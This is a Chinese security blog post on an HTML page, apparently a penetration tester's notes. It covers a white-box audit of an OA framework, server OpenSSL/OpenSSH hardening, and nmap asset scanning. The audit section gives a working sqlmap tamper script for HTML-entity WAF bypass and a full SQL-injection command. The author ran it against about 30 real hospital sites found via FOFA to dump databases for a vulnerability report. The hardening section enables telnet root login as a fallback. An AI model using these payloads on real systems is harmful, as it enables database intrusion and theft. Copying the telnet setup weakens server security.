@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-157457995-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  第一篇 &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="拖了好久好久。把当时的新知写出来，一次发，没期望多少人看完又长又啰嗦的纯文字。
+|blog under go1f.github.io">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="第一篇 | 春田花花幼稚园">
+    <meta name="twitter:description" content="拖了好久好久。把当时的新知写出来，一次发，没期望多少人看完又长又啰嗦的纯文字。|blog under go1f.github.io">
+    <meta name="twitter:image" content="/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="/">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/slience/">
+      
+      <span>沉默的小羔羔</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/tech/">
+      
+      <span>拙技</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/glance/">
+      
+      <span>速览</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>小黑板</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">第一篇</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2023-04-29. Published at: 2022-04-05.">
+        
+          Lastmod: 2023-04-29
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>拖了好久好久。把当时的新知写出来，一次发，没期望多少人看完又长又啰嗦的纯文字。</p>
+<h1 id="回顾cnvd加固首秀朴素资产扫描">回顾CNVD；加固首秀；朴素资产扫描</h1>
+<p>原创 kokoisko 沉默的小羔羔 <em>2022-04-05 17:02</em></p>
+<p>拖了好久好久。把当时的新知写出来，一次发，没期望多少人看完又长又啰嗦的纯文字。</p>
+<h1 id="第一节-回顾cnvd">第一节 回顾CNVD</h1>
+<p>缘起客户又怕事又怕死的本质，一季度完了，欲壑难填，又接力一季度渗透。去年底去短暂干了会驻场渗透。</p>
+<p>那个OA框架也属实是个漏洞库，偶尔出一两个RCE，被人批量提交收到通报在所难免。</p>
+<p>安服仔保不齐所有漏洞，特别是Nday也没资源，加上又不是渗透能手。</p>
+<p>只好尽地主之便宜，榨取所有，即白盒审计。</p>
+<p>故意获得一份代码，一枚C#开发的古老OA型网站框架。</p>
+<h2 id="前期">前期</h2>
+<p>为何说古老，在以往黑盒渗透，就碰见了asmx后缀的页面，这些页面风格复古。往往页面详尽列出接口功能，支持XML格式提交，往往不需要身份验证，往往毫无注入防护。就像JAVA潮流的Swagger UI的未授权访问。</p>
+<p>既然白盒，首先好奇到底有多少个ASMX的页面。列举了潜在的目标。</p>
+<pre tabindex="0"><code>import glob
+
+flist = glob.glob(&#34;**/*.asmx&#34;,recursive=True)
+for f in flist:
+   print(f)
+</code></pre><p>路径有了，几十个，当时第一个想到就是用扫描器批量扫。</p>
+<p>成熟的扫描器，应该让它自己找漏洞了。</p>
+<p>无果，AppScan的接口半自动扫描，要联动API测试工具(SoapUI/Postman等)逐个逐个点，AWVS、Xray似乎也无从扫起。</p>
+<p>也想过写脚本提取这些接口做成一个个数据请求包，觉得造轮子但又没找到现成的。</p>
+<p>不了了之。</p>
+<p>拖延了几个星期，又回来，手动审吧。</p>
+<p>发现asmx文件只是壳，一般只开头写一句，引用XXXX库，找具体的库文件，原来是dll，久仰。</p>
+<p>还好，C#逆向工具很多，搜了一下，dnSpy-net看着比较好。</p>
+<p>前端时间看到dnSpy-net被伪造了假官网，针对安全人员的投毒。</p>
+<p>吓了一下，我才刚进圈用用工具就被套了？还好是在GitHub下载的。</p>
+<p>傻瓜式操作的工具，拖dll文件进去，就可以了。</p>
+<p>界面像VScode。像我这样定向的轻量审计非常够用。</p>
+<p>一开头，瞄准了登录功能，WSLogin接口，莫名的有一个文件读取的接口，还能直接传入文件绝对路径，我当时是愣一愣。</p>
+<p>token参数还有注入，万能密码就绕过了，轻易斩获一枚SQL注入、一枚任意文件读取。</p>
+<p>接着，搜搜厂家，确认了是千万厂商，嘻嘻。</p>
+<p>上CNVD官网看看提交格式要求、漏洞标题命名什么的，搜索到厂家这个框架显示的漏洞不多，任意文件读取还是有，注入提交的也不多。</p>
+<p>有撞洞的可能。</p>
+<h2 id="收集期">收集期</h2>
+<p>先收集一下案例吧。</p>
+<p>fofa。那时候.so还能用。</p>
+<p>关键字比较重要，发现网站标题都写着“某某医院 — xxxoffice hospital”</p>
+<p>利用这个规律，顺利找到3、40个案例。搜索词没记下来，大概这样。</p>
+<pre tabindex="0"><code>title=&#34;xxxoffice hospital&#34;
+</code></pre><p>从朋友、评论区听说的通用型要20个案例起，本人比较害怕案例不够吞漏洞。</p>
+<p>比较怂，默默地照单全收，案例越多越好。</p>
+<p>接着手工验证了一下这些地址。</p>
+<p>咦？接口不存在？换一个站吧。才发现很多网站都没这个接口。唉。</p>
+<p>这个也许官方已经修补过了。看来只是我的客户维护比较渣。</p>
+<p>再咦？有WAF？小心翼翼的改掉敏感词。这样下去，搞不定啊，怎么凑够20+案例。</p>
+<p>心是有点凉。当晚漫无目的地看了几个接口，看起来漏洞也没这么多，碰到些钉子。</p>
+<p>觉得不行，还是把收集到的案例进行提前探测，确认有足够案例才开始审计，不然审出漏洞，才发现案例不够就嘥气。</p>
+<p>批量请求就要提一下httpx。这些细致又精致的小工具，真好。</p>
+<p>拼接主机域名+asmx的路径，形成一个几千条的URL文件。贴出的入门几年如一日水平的代码：</p>
+<pre tabindex="0"><code>fhost = open(&#34;xxxxoffice-targets.txt&#34;,&#34;r&#34;)
+fpath = open(&#34;asmx.txt&#34;,&#34;r&#34;)
+hosts = list()
+for l in fhost:
+  hosts.append(l.replace(&#34;\n&#34;,&#34;&#34;))
+
+asmxs = list()
+for l in fpath:
+  asmxs.append(l.replace(&#34;\n&#34;,&#34;&#34;))
+
+urls = list()
+for h in hosts:
+  for asmx in asmxs:
+      urls.append(h+asmx)
+print(urls)
+</code></pre><p>命令大概如下，主要观察返回的响应码、标题、响应包大小，就可以一窥这个接口版本有没改动。</p>
+<pre tabindex="0"><code>./httpx -l urls.txt -status-code -title -content-length
+</code></pre><p>最后，Sublime Text、Excel一波数据整理，汇总，排列。</p>
+<p>重点关注排头的接口，还是遇到钉子，注入点不是百分百，有些还是用上了预编译的。</p>
+<p>最后还是周折地调试着if-else-switch-case找到一个注入。</p>
+<p>记下笔记就还是心灰灰停歇了一两个星期？</p>
+<p>头上依然有多朵乌云，其一是绕WAF。</p>
+<h2 id="攻坚期">攻坚期</h2>
+<p>某周末回到家，中午吃完饭不知怎的，开了电脑，研究起了SQLmap怎么利用（因为SQL漏洞CNVD提交有SQLmap命令一栏要填）。</p>
+<p>仔细看了SQLmap手册，掌握了几个非常适合定制的参数。</p>
+<p>特别是现在这个布尔型注入。</p>
+<pre tabindex="0"><code>参数添加前缀：--prefix
+参数添加后缀：--suffix
+当布尔为假而匹配响应包字符串：--not-string
+注入类型指定布尔型：--technique=B
+burpsuite调试用：--proxy=http://127.0.0.1:8080
+还有-v3、--level=3等，后来发现非必要，减掉了。
+</code></pre><p>同时，burp抓流量调试发现，SQLMap对XML格式的请求参数的<code>&amp;</code>符号自动做HTML实体编码。</p>
+<p>一试发现，服务器端是支持实体编码解码的！</p>
+<p>天然的绕WAF！</p>
+<p>实测，市面上的大多数都没有实体编码的检测。面对客户的云WAF，直接打过去哈哈。</p>
+<p>确实为之一振。</p>
+<p>折腾一下，又模仿了一下tamper写法，弄了一个字符串全部实体编码的脚本。</p>
+<pre tabindex="0"><code>import re
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.LOW
+def dependencies():
+  pass
+def tamper(payload, **kwargs):
+  &#34;&#34;&#34;
+  HTML encode all characters except &amp; (e.g. &#39; -&gt; &amp;#39;)
+  &gt;&gt;&gt; tamper(&#34;1&#39; AND SLEEP(5)#&#34;)
+  &#39;&amp;#49;&amp;#39;&amp;#32;&amp;#65;&amp;#78;&amp;#68;&amp;#32;&amp;#83;&amp;#76;&amp;#69;&amp;#69;&amp;#80;&amp;#40;&amp;#53;&amp;#41;&amp;#35;&#39;
+  &#34;&#34;&#34;
+  return re.sub(r&#34;[^\&amp;]&#34;, lambda match: &#34;&amp;#%d;&#34; % ord(match.group(0)), payload) if payload else payload
+
+# print(tamper(&#34;1&#39; AND SLEEP(5)#&#34;))
+</code></pre><p>同时，因为SQLmap会对<code>&amp;</code>做实体编码，需要魔改，以1.5版本为例，sqlmap-1.5/lib/request/connect.py:1001行。删除掉<code>.replace('&amp;', &quot;&amp;&quot;)</code>，就可以了。</p>
+<p>学到了新的知识，很有有新鲜感。</p>
+<p>完整的命令如下，怕死，提交的时候加了randomcase,space2morecomment这些tamper，因为有些厉害的WAF还是检测到了攻击。</p>
+<pre tabindex="0"><code>python2 sqlmap-1.5/sqlmap.py -r req1 --random-agent --prefix=&#34;ap&#39;or 8999-9=8990&#34; --suffix=&#34;--isk0-&#34; --not-string=\&lt;GetEmpRightResult\&gt;-1 --technique=B --dbms=mssql --tamper randomcase,space2morecomment,htmlencodeall --threads=3 --dbs --batch
+</code></pre><h2 id="收获期">收获期</h2>
+<p>整理文档，格式调整。打包poc工具。</p>
+<p>截图。三十多个网站，一点一点贴网址，发送，截图，粘贴。其实，CNVD要求3个以上案例。当然，我还没敢当真。</p>
+<p>也害怕中途杀出太多强力WAF凑不够数。</p>
+<p>反正截多了，乏味。想到，其它证书都得交钱考，这个看似免费的证书，要点技术不说，是很耗时间。</p>
+<p>这些通用型的，忙的大咖们拿到几个证书填填简历后就懒得交了吧。</p>
+<p>录像。</p>
+<p>Gnome下的自带快捷键挺好。ALT+CTRL+SHIFT+R。只是只有20秒，于是就优化SQLMAP，让它赶快的，20秒出dump数据库的结果，哈哈。</p>
+<p>后来发现可以改的，调成无限制时间：</p>
+<pre tabindex="0"><code>gsettings set org.gnome.settings-daemon.plugins.media-keys max-screencast-length 0
+</code></pre><p>提交。</p>
+<p>接下来，就是祈望不要撞洞、不要厂商拒收历史漏洞。</p>
+<p>一个多月后，已经是年后，调休完上班登录企业微信，同事早几天就发证书给我了。</p>
+<h1 id="第二节-加固首秀-openssl111n">第二节 加固首秀-OpenSSL1.1.1n</h1>
+<p>终于遇到我最怕直面、最怕麻烦的加固工作。</p>
+<p>怕的是因为要Linux编译安装，而那些环境变量、软件依赖、乃至编译链接安装，都很少涉猎，特别是生产环境的系统，特别是这个物理机的CentOS，就没有镜像备份的概念。</p>
+<p>犹记得上次只是重启sshd来刷新版本，弹出个no hostkey alg都吓了一跳。</p>
+<p>犹记得上次，polkit升级，找了半天有签名的RPM包，然后rpm -Uvh，就为了避免源码编译。</p>
+<p>这次，OpenSSL升级，是硬货。</p>
+<h2 id="telnet保障">Telnet保障</h2>
+<p>序言：Telnet不开，机房就开。</p>
+<p>为10台机子，开telnet时，惊觉，8台都没有telnet-server服务，不禁默默赞上一位加固OpenSSH的工程师一句，艺高人胆大。</p>
+<pre tabindex="0"><code>#查看telnet-server版本
+rpm -qa telnet-server
+#没有就去阿里云下载对应xinetd、telnet-server的RPM包，看版本号，cat /etc/issue,http://mirrors.aliyun.com/centos-vault/6.5/os/x86_64/Packages/
+rpm -ivh xinetd
+rpm -ivh telnet-server
+#编辑disable=no,并启动telnet服务做备用
+vi /etc/xinetd.d/telnet
+#sed可以快速修改，无奈匹配符学得不好
+sed -i &#39;s/disable\t = no/disable\t=\tyes/g&#39; /etc/xinetd.d/telnet
+#确认
+cat /etc/xinetd.d/telnet
+
+service xinetd restart
+#开放23端口防火墙，Centos6.5 防火墙开放端口 
+vi /etc/sysconfig/iptables
+#开放23，发现管理员已经对特定IP放通所有端口，好，少折腾一个。
+##centos7的话
+firewall-cmd --zone=public --add-port=23/tcp
+firewall-cmd --reload
+</code></pre><p>默认Telnet禁止不信任的终端tty登陆Root用户，而普通账号又密码全过期了。</p>
+<p>懒得帮管理员改，所以选择无脑加白名单。how-enable-telnet-root-user，https://www.unix.com/linux/42697-how-enable-telnet-root-user.html</p>
+<pre tabindex="0"><code>#可查登陆记录，发现pts/0的告警日志
+tail /var/log/secure
+#Mar 31 11:42:13 server3 login: pam_securetty(remote:auth): access denied: tty &#39;pts/0&#39; is not secure !
+
+#添加tty白名单
+vi /etc/securetty
+#添加以下对应的终端
+pts/0
+pts/1
+pts/2
+pts/3
+pts/4
+pts/5
+pts/6
+pts/7
+pts/8
+pts/9
+
+#从同网段的机器登录，telnet一遍，测试成功
+telnet 19.XXX.XXX.150
+</code></pre><h2 id="for-openssl111x">For OpenSSL1.1.1x</h2>
+<p>SFTP把所有的依赖环境的RPM包、OpenSSL源码包拖到自己喜欢的路径。</p>
+<p>看见了历代加固工程师，喜欢放根目录，感觉就是一个字，为所欲为。</p>
+<pre tabindex="0"><code>#先看看版本
+openssl version
+#一个技巧，cd到前辈们的openssl目录，看他们的config配置：
+#perl configdata.pm --dump
+</code></pre><p>历史红利，一般编译环境都会有的。</p>
+<p>make gcc不需要怎么关注。</p>
+<p>我的思路保守，希望生成一个独立的OpenSSL，不要覆盖以前的。</p>
+<pre tabindex="0"><code>cd openssl-2022-3-30
+tar -zxvf openssl-1.1.1n.tar.gz
+cd openssl-1.1.1n
+#可以看到prefix、openssldir，指定了特定的文件夹，前辈笔记有shared参数，感觉不是必要的，删走。zlib本地测试没加上都能用，还是参考着写一写吧。
+./config zlib --prefix=/usr/local/openssl1.1.1n --openssldir=/usr/local/openssl1.1.1n
+
+#make clean
+#默认一切顺利
+make
+make install
+#去看看有无正确响应
+/usr/local/openssl1.1.1n/bin/openssl version
+#一般会报错找不到glibc.so
+</code></pre><p>所以将OpenSSL加载起来。</p>
+<pre tabindex="0"><code>#门面功夫（感觉非必要：将openssl的二进制链接起来，注意看当前系统openssl的路径
+which openssl
+mv /usr/bin/openssl /usr/bin/openssl.1.1.1k.bak
+mv /usr/include/openssl /usr/include/openssl.1.1.1k.bak
+ll /usr/bin/openssl.1.1.1k.bak
+
+ln -s /usr/local/openssl1.1.1n/bin/openssl /usr/bin/openssl
+ln -s /usr/local/openssl1.1.1n/include/openssl /usr/include/openssl
+
+#真正的登堂入室，加载配置
+#先备份
+cp /etc/ld.so.conf /etc/ld.so.conf.bak.3.31
+#追加写入/etc/ld.so.conf配置
+echo &#34;/usr/local/openssl1.1.1n/lib/&#34; &gt;&gt; /etc/ld.so.conf
+#再vi进去删除老的openssl库的行
+vi /etc/ld.so.conf
+#刷新加载
+/sbin/ldconfig
+
+openssl version
+#好的，偷懒的可以收工了。
+#上一位真·高工，升级的OpenSSH是动态加载OpenSSL的，所以，无缝升级了OpenSSH版本。
+sshd -VVVVVVVVVVVVV
+</code></pre><h2 id="for-openssh89">For OpenSSH8.9</h2>
+<pre tabindex="0"><code>tar -zxvf openssh-8.9p1.tar.gz
+cd openssh-8.9p1
+#要留意pam.d有没有这个sshd文件，可能导致重启后因为开了selinux而sshd起不来。没有就，复制一份cp contrib/sshd.pam.generic /etc/pam.d/sshd
+cp /etc/pam.d/sshd /etc/pam.d/sshd.3.23.bak
+#比较怂，整个文件夹备份
+cp -r /etc/ssh /etc/ssh.3.23.bak
+
+#指定ssl路径，这应该是静态SSL的写法。
+./configure --prefix=/opt/openssh8.9p1 --sysconfdir=/etc/ssh --with-pam --with-ssl-dir=/usr/local/openssl1.1.1n
+
+make
+make install
+
+#测试
+/opt/openssh8.9p1/sbin/sshd -t -f /etc/ssh/sshd_config
+vim /etc/ssh/sshd_config
+
+which sshd
+#根据真实路径备份
+mv /usr/sbin/sshd /usr/sbin/sshd.bak0325
+mv /usr/local/sbin/sshd /usr/local/sbin/sshd.bak0325
+ln -s /opt/openssh8.9p1/sbin/sshd /usr/local/sbin/sshd
+ll /usr/sbin/sshd.bak0325
+
+#链接，替代旧主。
+ln -s /opt/openssh8.9p1/sbin/sshd /usr/sbin/sshd
+
+sshd -V
+/etc/init.d/sshd restart
+service sshd restart
+</code></pre><h2 id="for-openssl102x">For OpenSSL1.0.2x</h2>
+<p>1.0.2有漏洞，但是官方也要收费支持，才能获得源码？</p>
+<p>所以我们全都升1.1.1，不要给自己设限，是可以的。</p>
+<p>实际上，跟上面章节几乎一样。</p>
+<p>除了perl的版本要编译升级一下。思路一样，独立安装，不想影响原来的perl，即添加Dversiononly参数</p>
+<p>OpenSSL升级提示perl版本较低（安装Perl）</p>
+<p>下载地址：https://www.perl.org/get.html#unix_like</p>
+<pre tabindex="0"><code>cd perl-5.34.1
+./Configure -des -Dprefix=/usr/local/perl-5.34.1 -Dusethreads -Dversiononly
+make
+make install
+mv /usr/bin/perl /usr/bin/perl.old.bak
+ln -s /usr/local/perl-5.34.1/bin/perl5.34.1 /usr/bin/perl
+perl -v
+</code></pre><p>可能zlib也太老，可以编译，可以找RPM，最新的软件对zlib版本要求都不高。</p>
+<pre tabindex="0"><code>tar -zxvf zlib-1.2.12.tar.gz
+cd zlib-1.2.12
+./configure
+make
+make install
+</code></pre><p>编译安装，</p>
+<p>愿你平安。</p>
+<pre tabindex="0"><code>#ERROR:crypto/threads_pthread.c:48: error: `PTHREAD_MUTEX_RECURSIVE&#39;
+#https://github.com/openssl/openssl/issues/10966
+./config --prefix=/usr/local/openssl1.1.1n/ --openssldir=/usr/local/openssl1.1.1n -D_XOPEN_SOURCE=500
+
+mv /usr/bin/openssl /usr/bin/openssl.1.0.1.bak
+ll /usr/bin/openssl.1.0.1.bak
+ln -s /usr/local/openssl1.1.1n/bin/openssl /usr/bin/openssl
+openssl version
+
+echo &#34;/usr/local/openssl1.1.1n/lib&#34; &gt;&gt; /etc/ld.so.conf
+/sbin/ldconfig
+</code></pre><p>已经觉得大功告成了。所以我7点决定下班。</p>
+<p>想着第二天收个尾，然后慢悠悠早早溜。</p>
+<p>第二天，傻了，ssh_exchange_identification: Connection closed by remote host，堡垒机登不上了，而Telnet没开！昨晚加班的恶果，兴冲冲的装了，却忘记上保险。</p>
+<p>原本1.0.2的OpenSSL换成1.1.1n后，猜被OpenSSH加载了，但不兼容，毕竟大版本升级了OpenSSL。</p>
+<h2 id="抢修方案">抢修方案</h2>
+<p>#ssh_exchange_identification: Connection closed by remote host</p>
+<p>冷静下来，思路是，ln是影响不了OpenSSH的，so库才是，还好做了备份。</p>
+<p>疫情，我不能进机房，只好委托机房管理员操办，不知道他的水平，只好，谨慎的写出简短精确的恢复命令。</p>
+<p>方案1、</p>
+<pre tabindex="0"><code>cp -f /etc/ld.so.conf.bak.3.31 /etc/ld.so.conf
+ldconfig
+openssl version
+service sshd start
+</code></pre><p>方案2、开启telnet</p>
+<p>由于不确定telnet-server是否安装（我忘了装，不推荐。</p>
+<pre tabindex="0"><code>rpm -qa telnet-server
+#如果有显示行，代表存在telnet服务
+service xinetd start
+</code></pre><p>非常幸运，恢复了。</p>
+<p>就在用户领导站起来，抬头望到我时。</p>
+<p>我对他一个肯定的呲牙点头，“可以了，辛苦嗮”，</p>
+<p>他得以放松地去吃午餐。</p>
+<h2 id="堡垒机太老---no-hostkey-algon-openssh-88ssh-rsa">堡垒机太老 - no hostkey alg.(On OpenSSH 8.8+,SSH-RSA)</h2>
+<p>我前一晚说收尾的工作就是，OpenSSH升级太高了，堡垒机又报经典的no hostkey alg。</p>
+<p>上次遇到后搜索找到方案是，清空/etc/ssh的key文件，重启sshd，即会重新生成密钥对。</p>
+<pre tabindex="0"><code>cd /etc/ssh
+mkdir host_key_bak
+mv ssh_host*key host_key_bak/
+mv ssh_host*pub host_key_bak/
+service sshd restart
+</code></pre><p>这里清key重启，失败了。</p>
+<p>本地测试好好的，这里就只报错，不自动生成key。</p>
+<p>手动生成：</p>
+<pre tabindex="0"><code>ssh-keygen -A
+service sshd restart
+</code></pre><p>还是只有堡垒机不行。</p>
+<p>这时我就猜到这个堡垒机年月太久了，肯定仅支持被老淘汰的密钥算法。</p>
+<p>但无奈，只能打给管理员，想轻轻的敲击一下他们，你们的堡垒机太老了。</p>
+<p>然后问问有没类似问题的解决手册，暂时答复是：下班了，明天请早。</p>
+<p>那我也别偷懒了，求人不如求己，线索有，找找方法更靠谱。</p>
+<p>对比以前生成的key和现在的key，发现少了一个名叫ssh_host_key的文件。</p>
+<p>cat查看，第一行:”SSH PRIVATE KEY FILE FORMAT 1.1“，原来这是ssh-rsa第一代算法，有缺陷，8.8起默认禁用了。</p>
+<p>所以，ssh-keygen也不能生成：</p>
+<pre tabindex="0"><code>ssh-keygen -t rsa1 -f /etc/ssh/ssh_host_key
+</code></pre><p>官方release，指出了潜在不兼容的问题。Potentially-incompatible changes</p>
+<p>可是，没有写服务器端的解决方法，还好stackexchange有。How to enable ssh-rsa in sshd of OpenSSH 8.8?</p>
+<pre tabindex="0"><code>#因为升级后的ssh-keygen不支持生成rsa1的key了，所以沿用以前的key
+#保留原来的ssh-rsa1的密钥对，/etc/ssh/ssh_host_key，文件特征是第一行:SSH PRIVATE KEY FILE FORMAT 1.1
+#There are also legacy RSA1 keys that should be gone today with SSHv1 protocol, but can be identified by the header:
+SSH PRIVATE KEY FILE FORMAT 1.1
+
+vim /etc/ssh/sshd_config
+#添加以下行，恢复ssh-rsa算法支持：
+HostKeyAlgorithms=ssh-rsa,ssh-rsa-cert-v01@openssh.com
+PubkeyAcceptedAlgorithms=+ssh-rsa,ssh-rsa-cert-v01@openssh.com
+
+#重启服务
+service sshd restart
+</code></pre><p>完满解决。</p>
+<h2 id="特别为你-errorsanswers">特别为你 Errors&amp;Answers</h2>
+<h3 id="1errorencctext0x1223-undefined-reference-to-bio_f_zlib">1、ERROR:enc.c:(.text+0x1223): undefined reference to `BIO_f_zlib'</h3>
+<p>清空上一次make的残留再make。</p>
+<pre tabindex="0"><code>make clean
+make
+</code></pre><h3 id="2openssl编译报错cryptothreads_pthreadc48-error-pthread_mutex_recursive">2、OpenSSL编译报错:crypto/threads_pthread.c:48: error: `PTHREAD_MUTEX_RECURSIVE'</h3>
+<p><a href="https://github.com/openssl/openssl/issues/10966">https://github.com/openssl/openssl/issues/10966</a></p>
+<p>多线程编译openssl的问题？添加-D_XOPEN_SOURCE=500参数</p>
+<pre tabindex="0"><code>./config --prefix=/usr/local/openssl1.1.1n/ --openssldir=/usr/local/openssl1.1.1n -D_XOPEN_SOURCE=500
+</code></pre><h3 id="3sshd_config-line-72-unsupported-option-gssapiauthentication">3、sshd_config line 72: Unsupported option GSSAPIAuthentication</h3>
+<p>关了GSSAPIAuthentication的支持，看起来也没用到</p>
+<pre tabindex="0"><code>vi /etc/ssh/sshd_config
+#注释掉GSSAPI相关的行，有两行。
+#/etc/ssh/sshd_config line 81: Unsupported option GSSAPIAuthentication
+#/etc/ssh/sshd_config line 83: Unsupported option GSSAPICleanupCredentials
+#测试
+/opt/openssh8.9p1/sbin/sshd -t -f /etc/ssh/sshd_config
+</code></pre><h3 id="4configure-error--zlibh-missing---please-install-first-or-check-configlog">4、configure: error: *** zlib.h missing - please install first or check config.log**</h3>
+<pre tabindex="0"><code>#下载RPM包，zlib的源码包。
+rpm -ivh zlib-1.2.1.2-1.2.x86_64.rpm
+rpm -ivh zlib-devel-1.2.1.2-1.2.i386.rpm
+
+#手动编译
+tar -zxvf zlib-1.2.12.tar.gz
+cd zlib-1.2.12
+./configure
+make
+make install
+</code></pre><h3 id="5编译openssh的依赖软件包">5、编译OpenSSH的依赖软件包</h3>
+<p><a href="https://blog.csdn.net/liumiaocn/article/details/103444258">https://blog.csdn.net/liumiaocn/article/details/103444258</a></p>
+<pre tabindex="0"><code>#yum install make gcc perl pcre-devel zlib-devel -y
+
+#离线安装
+rpm -ivh pam-0.77-66.26.x86_64.rpm
+rpm -ivh pam-devel-0.77-66.26.x86_64.rpm
+rpm -ivh make-3.80-7.EL4.x86_64.rpm
+rpm -ivh zlib-1.2.1.2-1.2.x86_64.rpm
+rpm -ivh zlib-devel-1.2.1.2-1.2.i386.rpm
+rpm -ivh pcre-devel-4.5-4.el4_6.6.x86_64.rpm
+rpm -ivh glibc-kernheaders-2.4-9.1.103.EL.x86_64.rpm
+rpm -ivh glibc-devel-2.3.4-2.43.x86_64.rpm
+</code></pre><h3 id="6error15-解决-sshd-no-hostkeys-available">6、Error(15) 解决 sshd: no hostkeys available</h3>
+<pre tabindex="0"><code>ssh-keygen -A
+service sshd restart
+</code></pre><h3 id="7your-openssl-headers-do-not-match-your-library">7、Your OpenSSL headers do not match your library.</h3>
+<p>1、提高headers版本的加载顺序。</p>
+<pre tabindex="0"><code>cat /etc/ld.so.conf
+ld.so.conf.d/*.conf
+/opt/openssl/openssl1.1.1k_20210609/lib
+/usr/local/lib64
+</code></pre><p>2、headers建立新link</p>
+<pre tabindex="0"><code>mv /usr/include/openssl /usr/include/openssl.1.1.1k.bak
+
+ln -s /usr/local/openssl1.1.1n/include/openssl /usr/include/openssl
+</code></pre><h3 id="8插曲-乱装rpm的余波">8、插曲-乱装RPM的余波</h3>
+<p>某台机器，RPM安装时报错：#libc.so.6: version &lsquo;GLIBC_2.14&rsquo; not found(require by /lib64/libgcc_s.so.1)</p>
+<p>我差点，以为GLIBC太老要升级，找了资料，发现升级glibc非同小可，搞错可以导致系统宕机。</p>
+<p>而博客们，可信度还是不高，不想节外生枝冒险。</p>
+<p>查一下谁引入了什么导致要求GLIBC_2.14吧。</p>
+<pre tabindex="0"><code>ll lib64/libgcc_s.so.1
+#指向/lib64/libgc_s-4.8.5-20150702.so.1
+</code></pre><p>谷歌了libgc_s-4.8.5-20150702.so.1，发现是CentOS7的包！</p>
+<p>libgcc-4.8.5-44.el7.x86_64.rpm</p>
+<p>再find全硬盘查找，果然找到这个RPM包，同目录还有其他编译环境用的RPM包。</p>
+<p>破案。</p>
+<p>有人以为这系统是CentOS 7，一通安装闯祸了，又不修好！</p>
+<p>思路，卸载gcc、gcc++，由于某些软件版本太高，版本依赖又互相纠缠</p>
+<p>只能边尝试rpm -e gcc卸载，边试rpm -Uvh &ndash;oldpackage gcc.rpm低版本退回，边安装rpm -i gcc.rpm 。</p>
+<p>几番递归，才解决。</p>
+<pre tabindex="0"><code>rpm -Uvh --oldpackage gcc.rpm
+</code></pre><p>无关的技巧：查看当前so的进程占用情况。</p>
+<pre tabindex="0"><code>lsof lib64/libgcc_s.so.1
+ldd sshd
+</code></pre><p>#########小节结束###########</p>
+<p>加固就是这么多意外。</p>
+<p>哪怕本地流畅调试成功。</p>
+<p>可加固就是钢石，利刃偶尔砍一下可以，长久还是不要挥出刀来，专业人士做吧。</p>
+<p>这一章，我写了太多“猜”的字眼，因为不愿意纠细节了，能用先用着吧，</p>
+<p>一扩散可以有无限多的分岔条件，不需要不需要精通。</p>
+<h1 id="第三节-资产扫描梳理">第三节 资产扫描梳理</h1>
+<p>用户给出域名、IP，怎么好一点、快点、别花太多手工的整理资产表。</p>
+<p>虽然名为暴露面梳理。</p>
+<p>goby想过，但是要长挂着不好，而且展示、导出也太局限了。</p>
+<p>思路还是很零落，一步一步凑，原始笨笨。</p>
+<h2 id="nmap调优">Nmap调优</h2>
+<p>Nmap官网的Manual和文章粗略看看，有收获的，人家零几年的文章经典流传。</p>
+<p>我调了几次的配置，最小IP分组，150。开T4档扫，T5太夸张，T3略平淡。</p>
+<p>最小扫描进程10，官方不推荐大于2。</p>
+<p>我全端口，有时间就是这样。</p>
+<p>不考虑存活，直接扫，-Pn。</p>
+<p>输出XML格式，方便数据处理。</p>
+<pre tabindex="0"><code>nohup nmap --randomize-hosts --min-hostgroup 150 -T4 --min-parallelism 10 -p- -v -n -Pn -oX scanc.xml -iL IPs.txt &amp;
+</code></pre><p>参考：不一定适用。</p>
+<p>工具| 诸神之眼nmap定制化之并发处理 - 云+社区 - 腾讯云 (tencent.com)https://cloud.tencent.com/developer/article/1075805</p>
+<p>Nmap Network Scanning—The Official Nmap Project Guide to Network Discovery and Security Scanning <a href="https://nmap.org/book">https://nmap.org/book</a></p>
+<h2 id="nmap导出整理">Nmap导出整理</h2>
+<p>NMAP扫出来的XML可以整理一下，例如端口数据转URL，见下方代码功能一。</p>
+<p>NMAP也可以扫端口指纹，上面的命令没加上，-sV。</p>
